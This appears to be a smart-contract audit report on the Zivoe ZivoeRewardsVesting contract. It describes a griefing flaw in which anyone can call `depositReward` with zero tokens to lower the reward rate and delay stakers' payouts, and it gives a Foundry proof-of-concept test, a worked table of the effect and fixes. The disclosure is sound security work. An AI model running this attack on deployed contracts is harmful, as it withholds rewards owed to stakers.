# Malicious actors can manipulate rewards for ZVE vesting, extending the time to accrue the whole reward

## Summary

[The function](https://github.com/sherlock-audit/2024-03-zivoe/blob/main/zivoe-core-foundry/src/ZivoeRewardsVesting.sol#L352) `depositReward` in `ZivoeRewardsVesting` can be called by anyone, making anyone available to deposit new rewards. However, the formula to calculate the new reward rate is an average of remaining rewards and new rewards divided by rewards duration, which can prolong the time for a staker to accrue all their rewards.

## Vulnerability Detail

Users can deposit any reward token amount to the `ZivoeRewardsVesting` contract. The new reward rate will then be calculated [here](https://github.com/sherlock-audit/2024-03-zivoe/blob/main/zivoe-core-foundry/src/ZivoeRewardsVesting.sol#L361) as a sum of original rewards to be distributed and new rewards divided by the reward duration (which is a value set when adding the specific reward token).

If we assume 1e24 reward tokens were deposited to the contract and the `rewardsDuration` is set to 30 days, depositing 0 rewards every 24 hours can have the following results:

| DAY | new reward rate | original reward | accumulated | % original | % total |
| --- | --------------- | --------------- | ----------- | ---------- | ------- |
| 0   | 3,85802E+17     | 0               | 0           | 0,00%      | 0,00%   |
| 1   | 3,72942E+17     | 3,33333E+22     | 3,33333E+22 | 96,67%     | 3,33%   |
| ... | ...             | ...             | ...         | ...        | ...     |
| 15  | 2,32015E+17     | 5E+23           | 3,98617E+23 | 60,14%     | 39,86%  |
| ... | ...             | ...             | ...         | ...        | ...     |
| 30  | 1,3953E+17      | 1E+24           | 6,38338E+23 | 36,17%     | 63,83%  |
| ... | ...             | ...             | ...         | ...        | ...     |
| 60  | 5,04626E+16     | 2E+24           | 8,69201E+23 | 13,08%     | 86,92%  |
| ... | ...             | ...             | ...         | ...        | ...     |
| 68  | 3,84754E+16     | 2,26667E+24     | 9,00272E+23 | 9,97%      | 90,03%  |

This table shows that depositing 0 rewards after 24 hours will cut the original reward rate to 96,67%. After 30 days, only 63,83% of the total reward (which was supposed to be claimed by now) can be claimed. Continuing like this will make it so that after 68 days, only 90% of the original reward can be claimed by stakers.

- **DAY**: number of days since start
- **new reward rate**: new reward rate after depositing 0 rewards on that day
- **original reward**: how much rewards should have been available by that day
- **accumulated**: how much rewards can be claimed on that day in reality
- **% original**: the reward rate compared to the original reward rate
- **% total**: the total reward available to be claimed compared to the original total reward

## Impact

Malicious actors can significantly extend the total time until all the staking rewards are distributed.

## Code Snippet

This test added to [Test_ZivoeRewardsVesting](https://github.com/sherlock-audit/2024-03-zivoe/blob/main/zivoe-core-testing/src/TESTS_Core/Test_ZivoeRewardsVesting.sol) shows that depositing 0 rewards by a malicious actor extends the period by another 30 days and cuts the current reward rate in half.

```Solidity
    function test_depositZeroRewardsWillDecreaseRewards() public {
        uint256 deposit = 1e24;
        uint256 amount = 1e24;

        // deposit 1e24 DAI as rewards
        depositReward_DAI(address(vestZVE), deposit);

        // create vesting schedule for pam
        assert(
            zvl.try_createVestingSchedule(
                address(vestZVE),
                address(pam),
                (amount % 360) + 1,
                ((amount % 360) * 5 + 1),
                (amount % 12_500_000 ether) + 1,
                true
            )
        );

        (, , uint rewardRateStart, , ) = vestZVE.rewardData(DAI);

        hevm.warp(block.timestamp + 15 days);
        uint pamRewardAfter15days = vestZVE.earned(address(pam), DAI);

        (, , uint rewardRateBeforeAttack, , ) = vestZVE.rewardData(DAI);
        // blackhat will deposit 0 tokens and lower the reward rate
        Blackhat blackHat = new Blackhat();
        assert(blackHat.try_depositReward(address(vestZVE), DAI, 0));

        (, , uint rewardRateAfterAttack, , ) = vestZVE.rewardData(DAI);

        // reward rate before attack is the same as the reward rate at the beginning
        assertEq(rewardRateStart, rewardRateBeforeAttack);
        // reward rate after attack will be less as the reward rate before attack
        assertLt(rewardRateAfterAttack, rewardRateBeforeAttack);

        //when other 15 days pass, pam should have at least 2x the rewards as after 15 days, but that is not true
        hevm.warp(block.timestamp + 15 days);
        uint pamRewardAfter30days = vestZVE.earned(address(pam), DAI);
        assertLt(pamRewardAfter30days, 2 * pamRewardAfter15days);
    }
```

## Tool used

Foundry, Manual review, Spreadsheets

## Recommendation

If this function should be open for everybody, consider changing the formula so that the reward rate for the remaining time stays the same.

If the current implementation was intentional, consider adding access control to the deposit reward function so only privileged users can call it.
